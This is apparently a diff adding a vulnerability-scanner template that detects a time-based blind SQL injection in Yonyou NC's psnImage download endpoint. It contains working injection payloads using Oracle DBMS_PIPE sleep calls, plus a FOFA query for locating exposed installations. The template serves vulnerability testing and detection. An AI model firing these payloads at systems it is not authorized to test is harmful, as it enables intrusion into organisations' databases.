@@ -1,0 +1,33 @@
+id: yonyou-nc-download-sqli
+
+info:
+  name: Yonyou NC download SQL Injection Vulnerability
+  author: Co5mos
+  severity: high
+  description: |
+    Yonyou NC system's download endpoint has a SQL injection vulnerability, allowing attackers to execute arbitrary SQL commands.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC%E6%8E%A5%E5%8F%A3download%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: 'app="用友-UFIDA-NC"'
+  tags: yonyou, sqli
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),5)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
+        Host: {{Hostname}}
+      
+      - |
+        @timeout: 20s
+        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),0)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration_1 >= 5 && duration_1 < 10
+          - duration_2 < 5
+        condition: and
